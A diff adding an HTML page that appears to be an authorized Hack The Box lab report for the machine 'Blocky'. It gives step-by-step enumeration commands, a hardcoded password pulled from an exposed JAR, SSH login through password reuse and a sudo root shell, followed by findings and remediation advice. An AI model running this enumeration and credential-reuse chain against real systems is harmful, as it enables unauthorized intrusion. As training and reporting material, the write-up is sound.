@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Hack The Box Report: Blocky</title>
+  <style>
+    :root {
+      --bg: #0f172a;
+      --panel: #111827;
+      --panel-2: #172033;
+      --text: #e5e7eb;
+      --muted: #94a3b8;
+      --line: #263244;
+      --accent: #38bdf8;
+      --accent-2: #22c55e;
+      --code-bg: #020617;
+      --code-border: #334155;
+      --critical: #ef4444;
+      --high: #f97316;
+      --medium: #eab308;
+      --low: #22c55e;
+      --shadow: 0 18px 45px rgba(0,0,0,.35);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      background:
+        radial-gradient(circle at top left, rgba(56,189,248,.16), transparent 32rem),
+        radial-gradient(circle at top right, rgba(34,197,94,.10), transparent 30rem),
+        var(--bg);
+      color: var(--text);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      line-height: 1.7;
+    }
+
+    a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .site-header {
+      border-bottom: 1px solid var(--line);
+      background: rgba(15, 23, 42, .82);
+      backdrop-filter: blur(16px);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .nav {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 1rem 1.25rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+    }
+
+    .brand {
+      font-weight: 800;
+      letter-spacing: .04em;
+      text-transform: uppercase;
+      color: #fff;
+    }
+
+    .nav-pill {
+      border: 1px solid rgba(56,189,248,.35);
+      color: var(--accent);
+      border-radius: 999px;
+      padding: .35rem .75rem;
+      font-size: .85rem;
+      background: rgba(56,189,248,.08);
+    }
+
+    .hero {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 3rem 1.25rem 1.5rem;
+    }
+
+    .hero-card {
+      background: linear-gradient(135deg, rgba(17,24,39,.95), rgba(23,32,51,.95));
+      border: 1px solid var(--line);
+      border-radius: 24px;
+      box-shadow: var(--shadow);
+      padding: 2rem;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .hero-card::after {
+      content: "";
+      position: absolute;
+      right: -6rem;
+      top: -6rem;
+      width: 16rem;
+      height: 16rem;
+      border-radius: 50%;
+      background: rgba(56,189,248,.12);
+      filter: blur(4px);
+    }
+
+    .eyebrow {
+      color: var(--accent-2);
+      text-transform: uppercase;
+      letter-spacing: .14em;
+      font-size: .8rem;
+      font-weight: 800;
+      margin-bottom: .75rem;
+    }
+
+    h1.main-title {
+      font-size: clamp(2rem, 5vw, 4rem);
+      line-height: 1.05;
+      margin: 0 0 1rem;
+      color: #fff;
+    }
+
+    .subtitle {
+      color: var(--muted);
+      max-width: 800px;
+      margin: 0;
+      font-size: 1.05rem;
+    }
+
+    .layout {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 1.5rem 1.25rem 4rem;
+      display: grid;
+      grid-template-columns: 280px minmax(0, 1fr);
+      gap: 1.5rem;
+    }
+
+    aside {
+      position: sticky;
+      top: 5.5rem;
+      align-self: start;
+      background: rgba(17,24,39,.88);
+      border: 1px solid var(--line);
+      border-radius: 18px;
+      padding: 1rem;
+      max-height: calc(100vh - 7rem);
+      overflow: auto;
+    }
+
+    aside h2 {
+      font-size: .8rem;
+      text-transform: uppercase;
+      letter-spacing: .12em;
+      color: var(--muted);
+      margin: 0 0 .75rem;
+      border: 0;
+      padding: 0;
+    }
+
+    .toc a {
+      display: block;
+      padding: .42rem .55rem;
+      border-radius: 10px;
+      color: var(--muted);
+      font-size: .9rem;
+    }
+
+    .toc a:hover {
+      color: #fff;
+      background: rgba(56,189,248,.08);
+      text-decoration: none;
+    }
+
+    .toc-sub {
+      margin-left: .75rem;
+      font-size: .82rem !important;
+    }
+
+    main {
+      min-width: 0;
+      background: rgba(17,24,39,.72);
+      border: 1px solid var(--line);
+      border-radius: 24px;
+      box-shadow: var(--shadow);
+      padding: 2rem;
+    }
+
+    h1, h2, h3, h4 {
+      color: #fff;
+      line-height: 1.25;
+    }
+
+    main h1.main-title {
+      display: none;
+    }
+
+    h2 {
+      margin-top: 2.75rem;
+      padding-bottom: .55rem;
+      border-bottom: 1px solid var(--line);
+      font-size: 1.6rem;
+    }
+
+    h2:first-of-type {
+      margin-top: 0;
+    }
+
+    h3 {
+      margin-top: 2rem;
+      font-size: 1.2rem;
+    }
+
+    p {
+      color: var(--text);
+    }
+
+    blockquote {
+      margin: 1.25rem 0;
+      padding: 1rem 1.25rem;
+      border-left: 4px solid var(--accent);
+      background: rgba(56,189,248,.08);
+      border-radius: 0 14px 14px 0;
+      color: var(--text);
+    }
+
+    blockquote p {
+      margin: 0;
+    }
+
+    .section-rule {
+      border: 0;
+      border-top: 1px solid var(--line);
+      margin: 2rem 0;
+      opacity: .75;
+    }
+
+    .table-wrap {
+      overflow-x: auto;
+      margin: 1.25rem 0;
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      background: rgba(2,6,23,.28);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      min-width: 560px;
+    }
+
+    th, td {
+      padding: .85rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid var(--line);
+      vertical-align: top;
+    }
+
+    th {
+      background: rgba(56,189,248,.10);
+      color: #f8fafc;
+      font-size: .85rem;
+      text-transform: uppercase;
+      letter-spacing: .06em;
+    }
+
+    tr:last-child td {
+      border-bottom: 0;
+    }
+
+    code {
+      font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+      background: rgba(15,23,42,.95);
+      color: #bae6fd;
+      border: 1px solid rgba(148,163,184,.18);
+      border-radius: 6px;
+      padding: .14rem .32rem;
+      font-size: .9em;
+    }
+
+    .code-card {
+      margin: 1.25rem 0;
+      border: 1px solid var(--code-border);
+      border-radius: 16px;
+      background: var(--code-bg);
+      overflow: hidden;
+    }
+
+    .code-label {
+      padding: .45rem .8rem;
+      border-bottom: 1px solid var(--code-border);
+      color: var(--muted);
+      font-size: .76rem;
+      text-transform: uppercase;
+      letter-spacing: .12em;
+      background: rgba(148,163,184,.08);
+    }
+
+    pre {
+      margin: 0;
+      padding: 1rem;
+      overflow-x: auto;
+    }
+
+    pre code {
+      display: block;
+      border: 0;
+      background: transparent;
+      color: #d1fae5;
+      padding: 0;
+      line-height: 1.6;
+      font-size: .9rem;
+    }
+
+    ul, ol {
+      padding-left: 1.4rem;
+    }
+
+    li {
+      margin: .35rem 0;
+    }
+
+    .sev {
+      display: inline-block;
+      border-radius: 999px;
+      padding: .15rem .55rem;
+      font-size: .78rem;
+      font-weight: 800;
+      color: #020617;
+      vertical-align: middle;
+    }
+
+    .sev.critical { background: var(--critical); color: #fff; }
+    .sev.high { background: var(--high); color: #111827; }
+    .sev.medium { background: var(--medium); color: #111827; }
+    .sev.low { background: var(--low); color: #052e16; }
+
+    .footer {
+      color: var(--muted);
+      text-align: center;
+      padding: 2rem 1rem 3rem;
+      font-size: .9rem;
+    }
+
+    @media (max-width: 900px) {
+      .layout {
+        grid-template-columns: 1fr;
+      }
+
+      aside {
+        position: static;
+        max-height: none;
+      }
+
+      main {
+        padding: 1.25rem;
+      }
+
+      .hero-card {
+        padding: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header class="site-header">
+    <nav class="nav">
+      <div class="brand">HTB Machine Reports</div>
+      <div class="nav-pill">Blocky · Linux · Easy</div>
+    </nav>
+  </header>
+
+  <section class="hero">
+    <div class="hero-card">
+      <div class="eyebrow">Hack The Box Walkthrough Report</div>
+      <h1 class="main-title">Blocky</h1>
+      <p class="subtitle">A portfolio-style penetration testing report covering enumeration, exposed plugin discovery, hardcoded credential extraction, SSH access, and sudo-based privilege escalation.</p>
+    </div>
+  </section>
+
+  <div class="layout">
+    <aside>
+      <h2>Contents</h2>
+      <nav class="toc">
+        <a class="toc-main" href="#overview">Overview</a>
+<a class="toc-main" href="#executive-summary">Executive Summary</a>
+<a class="toc-main" href="#scope">Scope</a>
+<a class="toc-main" href="#open-ports">Open Ports</a>
+<a class="toc-main" href="#methodology">Methodology</a>
+<a class="toc-main" href="#1-initial-enumeration">1. Initial Enumeration</a>
+<a class="toc-sub" href="#nmap-scan">Nmap Scan</a>
+<a class="toc-sub" href="#results">Results</a>
+<a class="toc-main" href="#2-web-enumeration">2. Web Enumeration</a>
+<a class="toc-sub" href="#whatweb">WhatWeb</a>
+<a class="toc-main" href="#3-wordpress-enumeration">3. WordPress Enumeration</a>
+<a class="toc-sub" href="#wpscan">WPScan</a>
+<a class="toc-sub" href="#key-findings">Key Findings</a>
+<a class="toc-main" href="#4-plugin-file-discovery">4. Plugin File Discovery</a>
+<a class="toc-sub" href="#exposed-files">Exposed Files</a>
+<a class="toc-main" href="#5-jar-file-analysis">5. JAR File Analysis</a>
+<a class="toc-sub" href="#hardcoded-credentials-found">Hardcoded Credentials Found</a>
+<a class="toc-main" href="#6-username-enumeration">6. Username Enumeration</a>
+<a class="toc-main" href="#7-initial-access">7. Initial Access</a>
+<a class="toc-sub" href="#result">Result</a>
+<a class="toc-main" href="#8-privilege-escalation">8. Privilege Escalation</a>
+<a class="toc-sub" href="#result">Result</a>
+<a class="toc-main" href="#attack-chain">Attack Chain</a>
+<a class="toc-main" href="#findings">Findings</a>
+<a class="toc-sub" href="#finding-1-outdated-wordpress-installation">Finding 1: Outdated WordPress Installation</a>
+<a class="toc-sub" href="#finding-2-directory-listing-enabled">Finding 2: Directory Listing Enabled</a>
+<a class="toc-sub" href="#finding-3-sensitive-jar-file-exposed-through-web-server">Finding 3: Sensitive JAR File Exposed Through Web Server</a>
+<a class="toc-sub" href="#finding-4-hardcoded-credentials-in-application-code">Finding 4: Hardcoded Credentials in Application Code</a>
+<a class="toc-sub" href="#finding-5-password-reuse-allowed-ssh-compromise">Finding 5: Password Reuse Allowed SSH Compromise</a>
+<a class="toc-sub" href="#finding-6-excessive-sudo-privileges">Finding 6: Excessive Sudo Privileges</a>
+<a class="toc-main" href="#remediation-summary">Remediation Summary</a>
+<a class="toc-main" href="#lessons-learned">Lessons Learned</a>
+<a class="toc-main" href="#useful-commands">Useful Commands</a>
+<a class="toc-main" href="#conclusion">Conclusion</a>
+      </nav>
+    </aside>
+
+    <main>
+      <h1 id="hack-the-box-report-blocky" class="main-title">Hack The Box Report: Blocky</h1>
+<h2 id="overview" class="">Overview</h2>
+<div class="table-wrap"><table>
+<tr><th>Field</th><th>Value</th></tr>
+<tr><td>Machine</td><td>Blocky</td></tr>
+<tr><td>Target IP</td><td><code>10.129.26.180</code></td></tr>
+<tr><td>Hostname</td><td><code>blocky.htb</code></td></tr>
+<tr><td>Operating System</td><td>Ubuntu Linux</td></tr>
+<tr><td>Difficulty</td><td>Easy</td></tr>
+<tr><td>Status</td><td>Completed</td></tr>
+<tr><td>User Access</td><td>Achieved as <code>notch</code></td></tr>
+<tr><td>Root Access</td><td>Achieved through sudo privileges</td></tr>
+</table></div>
+<blockquote>
+<p><strong>Note:</strong> Flag values are intentionally omitted/redacted for report cleanliness and portfolio use.</p>
+</blockquote>
+<hr class="section-rule">
+<h2 id="executive-summary" class="">Executive Summary</h2>
+<p>The target exposed several services, including FTP, SSH, HTTP, and Minecraft. Initial enumeration showed that the web service redirected to <code>blocky.htb</code> and hosted a WordPress 4.8 site. Further web enumeration discovered a <code>/plugins/</code> file browser that exposed downloadable Minecraft plugin JAR files.</p>
+<p>The custom <code>BlockyCore.jar</code> file contained hardcoded database credentials. After extracting strings from the Java class file, a reusable password was discovered. WordPress author enumeration revealed the username <code>notch</code>, and the password from the JAR file was successfully reused to gain SSH access as <code>notch</code>.</p>
+<p>Privilege escalation was straightforward after login because <code>sudo -l</code> showed that <code>notch</code> could run all commands as root. Using sudo, root access was obtained and the machine was fully compromised.</p>
+<hr class="section-rule">
+<h2 id="scope" class="">Scope</h2>
+<p>This report covers authorized Hack The Box lab activity against:</p>
+<ul>
+<li><strong>Target:</strong> <code>10.129.26.180</code></li>
+<li><strong>Hostname:</strong> <code>blocky.htb</code></li>
+<li><strong>Environment:</strong> HTB lab network</li>
+</ul>
+<hr class="section-rule">
+<h2 id="open-ports" class="">Open Ports</h2>
+<ul>
+<li><code>21/tcp ftp</code></li>
+<li><code>22/tcp ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2</code></li>
+<li><code>80/tcp http Apache 2.4.18 WordPress 4.8</code></li>
+<li><code>25565/tcp minecraft Minecraft 1.11.2</code></li>
+</ul>
+<hr class="section-rule">
+<h2 id="methodology" class="">Methodology</h2>
+<p>The assessment followed a standard penetration testing flow:</p>
+<ol>
+<li>Network enumeration</li>
+<li>Service enumeration</li>
+<li>Web application enumeration</li>
+<li>File discovery and analysis</li>
+<li>Credential discovery</li>
+<li>Password reuse testing</li>
+<li>SSH access</li>
+<li>Local privilege escalation</li>
+<li>Root compromise</li>
+</ol>
+<hr class="section-rule">
+<h2 id="1-initial-enumeration" class="">1. Initial Enumeration</h2>
+<h3 id="nmap-scan" class="">Nmap Scan</h3>
+<div class="code-card"><div class="code-label">bash</div><pre><code>nmap -sCV -p21,22,80,25565 -oN nmap_initial.txt 10.129.26.180</code></pre></div>
+<h3 id="results" class="">Results</h3>
+<p>The initial scan identified four open services:</p>
+<div class="table-wrap"><table>
+<tr><th>Port</th><th>Service</th><th>Details</th></tr>
+<tr><td>21/tcp</td><td>FTP</td><td>FTP service open</td></tr>
+<tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.2</td></tr>
+<tr><td>80/tcp</td><td>HTTP</td><td>Apache 2.4.18 running WordPress 4.8</td></tr>
+<tr><td>25565/tcp</td><td>Minecraft</td><td>Minecraft 1.11.2</td></tr>
+</table></div>
+<p>The scan also identified the hostname:</p>
+<div class="code-card"><div class="code-label">text</div><pre><code>blocky.htb</code></pre></div>
+<p>This hostname was added to <code>/etc/hosts</code> so the web application could be browsed correctly.</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>echo &quot;10.129.26.180 blocky.htb&quot; | sudo tee -a /etc/hosts</code></pre></div>
+<hr class="section-rule">
+<h2 id="2-web-enumeration" class="">2. Web Enumeration</h2>
+<h3 id="whatweb" class="">WhatWeb</h3>
+<div class="code-card"><div class="code-label">bash</div><pre><code>whatweb -v http://10.129.26.180</code></pre></div>
+<p>The HTTP service redirected from the IP address to:</p>
+<div class="code-card"><div class="code-label">text</div><pre><code>http://blocky.htb</code></pre></div>
+<p>The web application was identified as:</p>
+<ul>
+<li>Apache 2.4.18 on Ubuntu</li>
+<li>WordPress 4.8</li>
+<li>Site title: <code>BlockyCraft - Under Construction</code></li>
+<li>jQuery 1.12.4</li>
+</ul>
+<hr class="section-rule">
+<h2 id="3-wordpress-enumeration" class="">3. WordPress Enumeration</h2>
+<h3 id="wpscan" class="">WPScan</h3>
+<p>The first WPScan attempt against the IP timed out because the application expected the hostname. Running WPScan against <code>blocky.htb</code> succeeded.</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>wpscan --url http://blocky.htb --enumerate u,p,t --plugins-detection aggressive -o wpscan_enum.txt</code></pre></div>
+<h3 id="key-findings" class="">Key Findings</h3>
+<p>WPScan confirmed:</p>
+<ul>
+<li>WordPress 4.8</li>
+<li>XML-RPC enabled at <code>/xmlrpc.php</code></li>
+<li>WordPress readme exposed at <code>/readme.html</code></li>
+<li><code>wp-cron.php</code> enabled</li>
+<li>Uploads directory listing enabled</li>
+<li>Theme: <code>twentyseventeen</code> version 1.3</li>
+<li>Plugin: <code>akismet</code> version 3.3.2</li>
+</ul>
+<p>The uploads directory was browsable:</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>curl -s http://blocky.htb/wp-content/uploads/</code></pre></div>
+<p>Further enumeration found:</p>
+<div class="code-card"><div class="code-label">text</div><pre><code>/wp-content/uploads/2017/
+/wp-content/uploads/2017/07/</code></pre></div>
+<p>The exposed files were Minecraft wallpaper images. No credentials or code files were found in the uploads directory.</p>
+<hr class="section-rule">
+<h2 id="4-plugin-file-discovery" class="">4. Plugin File Discovery</h2>
+<p>A manual request to <code>/plugins/</code> initially returned a redirect. Following redirects revealed a custom file browser.</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>curl -Ls http://blocky.htb/plugins/</code></pre></div>
+<p>The page was titled:</p>
+<div class="code-card"><div class="code-label">text</div><pre><code>Cute file browser</code></pre></div>
+<p>The JavaScript for this page called:</p>
+<div class="code-card"><div class="code-label">text</div><pre><code>/plugins/scan.php</code></pre></div>
+<p>Querying <code>scan.php</code> exposed two downloadable plugin files:</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>curl -Ls http://blocky.htb/plugins/scan.php</code></pre></div>
+<h3 id="exposed-files" class="">Exposed Files</h3>
+<div class="code-card"><div class="code-label">text</div><pre><code>/plugins/files/BlockyCore.jar
+/plugins/files/griefprevention-1.11.2-3.1.1.298.jar</code></pre></div>
+<p>The <code>BlockyCore.jar</code> file was small and appeared to be a custom plugin, making it the most interesting file for analysis.</p>
+<hr class="section-rule">
+<h2 id="5-jar-file-analysis" class="">5. JAR File Analysis</h2>
+<p>The custom JAR file was inspected locally. Strings were extracted from the Java class file:</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>unzip -p BlockyCore.jar com/myfirstplugin/BlockyCore.class | strings -a</code></pre></div>
+<h3 id="hardcoded-credentials-found" class="">Hardcoded Credentials Found</h3>
+<p>The extracted class strings revealed hardcoded database connection values:</p>
+<div class="code-card"><div class="code-label">text</div><pre><code>sqlHost localhost
+sqlUser root
+sqlPass 8YsqfCTnvxAUeduzjNSXe22</code></pre></div>
+<p>This was the critical finding. The password was likely intended for local database access, but it was also worth testing for password reuse.</p>
+<hr class="section-rule">
+<h2 id="6-username-enumeration" class="">6. Username Enumeration</h2>
+<p>The WordPress REST users endpoint did not reveal users:</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>curl -s http://blocky.htb/wp-json/wp/v2/users</code></pre></div>
+<p>It returned <code>404 Not Found</code>.</p>
+<p>WordPress author enumeration was then attempted:</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>for i in {1..10}; do
+  curl -sI -L &quot;http://blocky.htb/?author=$i&quot; | awk -v i=&quot;$i&quot; &#x27;/^Location:/ {print i, $2}&#x27;
+done</code></pre></div>
+<p>This revealed a valid username:</p>
+<div class="code-card"><div class="code-label">text</div><pre><code>notch</code></pre></div>
+<p>At this point, the known credential pair was:</p>
+<div class="code-card"><div class="code-label">text</div><pre><code>notch:8YsqfCTnvxAUeduzjNSXe22</code></pre></div>
+<hr class="section-rule">
+<h2 id="7-initial-access" class="">7. Initial Access</h2>
+<p>SSH access was attempted as <code>notch</code>.</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password notch@10.129.26.180</code></pre></div>
+<p>After carefully entering the password from <code>BlockyCore.jar</code>, SSH login succeeded.</p>
+<h3 id="result" class="">Result</h3>
+<div class="code-card"><div class="code-label">text</div><pre><code>User shell obtained as notch</code></pre></div>
+<p>The SSH banner confirmed the target was Ubuntu 16.04.2 LTS with kernel <code>4.4.0-62-generic</code>.</p>
+<p>The user flag was captured from the <code>notch</code> account.</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>cat user.txt</code></pre></div>
+<p>Flag value is redacted in this report.</p>
+<hr class="section-rule">
+<h2 id="8-privilege-escalation" class="">8. Privilege Escalation</h2>
+<p>After gaining SSH access, sudo privileges were checked:</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>sudo -l</code></pre></div>
+<h3 id="result" class="">Result</h3>
+<div class="code-card"><div class="code-label">text</div><pre><code>User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL</code></pre></div>
+<p>This means <code>notch</code> had full sudo privileges and could execute any command as root.</p>
+<p>A root shell could be obtained with:</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>sudo su</code></pre></div>
+<p>or:</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>sudo /bin/bash</code></pre></div>
+<p>Root access was achieved successfully.</p>
+<p>The root flag was captured.</p>
+<div class="code-card"><div class="code-label">bash</div><pre><code>cat root.txt</code></pre></div>
+<p>Flag value is redacted in this report.</p>
+<hr class="section-rule">
+<h2 id="attack-chain" class="">Attack Chain</h2>
+<div class="code-card"><div class="code-label">text</div><pre><code>Nmap scan
+  ↓
+HTTP service identified
+  ↓
+Hostname blocky.htb discovered
+  ↓
+WordPress 4.8 enumeration
+  ↓
+/plugins/ custom file browser found
+  ↓
+BlockyCore.jar downloaded
+  ↓
+Hardcoded password extracted from JAR
+  ↓
+WordPress username notch discovered
+  ↓
+Password reused over SSH
+  ↓
+Shell as notch
+  ↓
+sudo -l shows (ALL : ALL) ALL
+  ↓
+Root shell</code></pre></div>
+<hr class="section-rule">
+<h2 id="findings" class="">Findings</h2>
+<h3 id="finding-1-outdated-wordpress-installation" class="">Finding 1: Outdated WordPress Installation</h3>
+<p><strong>Severity:</strong> <span class="sev medium">Medium</span></p>
+<p>The target was running WordPress 4.8, an outdated version with known public security advisories. While no direct WordPress exploit was required for this compromise, outdated CMS software increases the attack surface.</p>
+<p><strong>Evidence:</strong></p>
+<div class="code-card"><div class="code-label">text</div><pre><code>WordPress 4.8
+Apache 2.4.18</code></pre></div>
+<p><strong>Recommendation:</strong></p>
+<p>Update WordPress core, themes, and plugins regularly. Disable unnecessary WordPress features and remove unused plugins.</p>
+<hr class="section-rule">
+<h3 id="finding-2-directory-listing-enabled" class="">Finding 2: Directory Listing Enabled</h3>
+<p><strong>Severity:</strong> <span class="sev medium">Medium</span></p>
+<p>Directory listing was enabled under the WordPress uploads directory and the custom plugin file browser.</p>
+<p><strong>Evidence:</strong></p>
+<div class="code-card"><div class="code-label">text</div><pre><code>/wp-content/uploads/
+/wp-content/uploads/2017/
+/plugins/</code></pre></div>
+<p>The uploads directory only exposed images, but <code>/plugins/</code> exposed sensitive downloadable Java plugin files.</p>
+<p><strong>Recommendation:</strong></p>
+<p>Disable directory listing at the web server level. Sensitive files should not be stored in web-accessible paths.</p>
+<hr class="section-rule">
+<h3 id="finding-3-sensitive-jar-file-exposed-through-web-server" class="">Finding 3: Sensitive JAR File Exposed Through Web Server</h3>
+<p><strong>Severity:</strong> <span class="sev high">High</span></p>
+<p>The custom Minecraft plugin file <code>BlockyCore.jar</code> was publicly downloadable from the web server.</p>
+<p><strong>Evidence:</strong></p>
+<div class="code-card"><div class="code-label">text</div><pre><code>/plugins/files/BlockyCore.jar</code></pre></div>
+<p>This file contained application logic and hardcoded credentials.</p>
+<p><strong>Recommendation:</strong></p>
+<p>Do not expose application plugin files publicly. Store server-side application files outside the web root and restrict access to sensitive directories.</p>
+<hr class="section-rule">
+<h3 id="finding-4-hardcoded-credentials-in-application-code" class="">Finding 4: Hardcoded Credentials in Application Code</h3>
+<p><strong>Severity:</strong> <span class="sev critical">Critical</span></p>
+<p>The <code>BlockyCore.jar</code> file contained hardcoded credentials.</p>
+<p><strong>Evidence:</strong></p>
+<div class="code-card"><div class="code-label">text</div><pre><code>sqlHost localhost
+sqlUser root
+sqlPass 8YsqfCTnvxAUeduzjNSXe22</code></pre></div>
+<p>Hardcoded secrets are dangerous because anyone with access to the source code or compiled application can extract them.</p>
+<p><strong>Recommendation:</strong></p>
+<p>Remove hardcoded credentials from application code. Use environment variables, secrets managers, or protected configuration files with strict permissions. Rotate the exposed password immediately.</p>
+<hr class="section-rule">
+<h3 id="finding-5-password-reuse-allowed-ssh-compromise" class="">Finding 5: Password Reuse Allowed SSH Compromise</h3>
+<p><strong>Severity:</strong> <span class="sev critical">Critical</span></p>
+<p>The password found in <code>BlockyCore.jar</code> was reused for the system user <code>notch</code>, allowing SSH login.</p>
+<p><strong>Evidence:</strong></p>
+<div class="code-card"><div class="code-label">text</div><pre><code>Username: notch
+Password: discovered in BlockyCore.jar
+Service: SSH</code></pre></div>
+<p><strong>Recommendation:</strong></p>
+<p>Enforce unique passwords across services. Use key-based SSH authentication where possible and disable password authentication for SSH.</p>
+<hr class="section-rule">
+<h3 id="finding-6-excessive-sudo-privileges" class="">Finding 6: Excessive Sudo Privileges</h3>
+<p><strong>Severity:</strong> <span class="sev critical">Critical</span></p>
+<p>The user <code>notch</code> had full sudo rights.</p>
+<p><strong>Evidence:</strong></p>
+<div class="code-card"><div class="code-label">text</div><pre><code>(ALL : ALL) ALL</code></pre></div>
+<p>This allowed immediate privilege escalation to root.</p>
+<p><strong>Recommendation:</strong></p>
+<p>Apply least privilege. Users should only have sudo access to commands required for their role. Full sudo privileges should be limited to trusted administrators.</p>
+<hr class="section-rule">
+<h2 id="remediation-summary" class="">Remediation Summary</h2>
+<div class="table-wrap"><table>
+<tr><th>Issue</th><th>Recommendation</th></tr>
+<tr><td>Outdated WordPress</td><td>Update WordPress core, themes, and plugins</td></tr>
+<tr><td>Directory listing</td><td>Disable directory indexing</td></tr>
+<tr><td>Exposed plugin files</td><td>Move sensitive files outside the web root</td></tr>
+<tr><td>Hardcoded credentials</td><td>Use secure secrets management</td></tr>
+<tr><td>Password reuse</td><td>Enforce unique passwords and rotate exposed credentials</td></tr>
+<tr><td>SSH password login</td><td>Prefer key-based authentication</td></tr>
+<tr><td>Excessive sudo access</td><td>Apply least privilege</td></tr>
+</table></div>
+<hr class="section-rule">
+<h2 id="lessons-learned" class="">Lessons Learned</h2>
+<ul>
+<li>Always enumerate unusual web directories manually.</li>
+<li>Follow redirects during web enumeration.</li>
+<li>Small custom files are often more valuable than large third-party files.</li>
+<li>Compiled Java files can still leak sensitive strings.</li>
+<li>Password reuse is a common path from web findings to shell access.</li>
+<li><code>sudo -l</code> should be one of the first checks after getting a Linux shell.</li>
+<li>Full sudo privileges usually mean root access is one command away.</li>
+</ul>
+<hr class="section-rule">
+<h2 id="useful-commands" class="">Useful Commands</h2>
+<div class="code-card"><div class="code-label">bash</div><pre><code># Service scan
+nmap -sCV -p21,22,80,25565 -oN nmap_initial.txt 10.129.26.180
+
+# Add hostname
+echo &quot;10.129.26.180 blocky.htb&quot; | sudo tee -a /etc/hosts
+
+# Web fingerprinting
+whatweb -v http://blocky.htb
+
+# WordPress scan
+wpscan --url http://blocky.htb --enumerate u,p,t --plugins-detection aggressive -o wpscan_enum.txt
+
+# Check uploads directory
+curl -s http://blocky.htb/wp-content/uploads/
+
+# Follow plugin directory redirects
+curl -Ls http://blocky.htb/plugins/
+
+# Query plugin file browser endpoint
+curl -Ls http://blocky.htb/plugins/scan.php
+
+# Extract strings from JAR class
+unzip -p BlockyCore.jar com/myfirstplugin/BlockyCore.class | strings -a
+
+# WordPress author enumeration
+for i in {1..10}; do
+  curl -sI -L &quot;http://blocky.htb/?author=$i&quot; | awk -v i=&quot;$i&quot; &#x27;/^Location:/ {print i, $2}&#x27;
+done
+
+# SSH as discovered user
+ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password notch@10.129.26.180
+
+# Check sudo permissions
+sudo -l
+
+# Get root shell
+sudo /bin/bash</code></pre></div>
+<hr class="section-rule">
+<h2 id="conclusion" class="">Conclusion</h2>
+<p>Blocky was compromised through a chain of web enumeration, exposed application files, hardcoded credentials, password reuse, and excessive sudo privileges. The most important discovery was the exposed <code>BlockyCore.jar</code> file, which revealed a reusable password. Once the username <code>notch</code> was discovered through WordPress author enumeration, the password allowed SSH access. Full sudo privileges then allowed immediate escalation to root.</p>
+<p>The main defensive takeaways are to avoid exposing sensitive files, never hardcode credentials, prevent password reuse, and enforce least privilege for sudo access.</p>
+    </main>
+  </div>
+
+  <footer class="footer">
+    Authorized Hack The Box lab report. Flag values intentionally omitted for portfolio use.
+  </footer>
+</body>
+</html>
